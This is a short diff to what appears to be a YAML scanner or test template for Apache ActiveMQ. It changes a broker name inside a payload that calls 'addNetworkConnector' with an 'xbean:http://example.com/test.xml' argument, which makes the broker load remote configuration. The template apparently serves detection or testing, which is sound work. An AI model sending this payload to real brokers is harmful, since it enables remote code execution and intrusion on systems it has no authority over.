@@ -53,7 +53,7 @@ payloads:
             "type": "exec",
             "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
             "operation": "addNetworkConnector",
-            "arguments": ["static:(vm://test_kajbdhv?brokerConfig=xbean:http://example.com/test.xml)"]
+            "arguments": ["static:(vm://test?brokerConfig=xbean:http://example.com/test.xml)"]
           }}
 
         response:
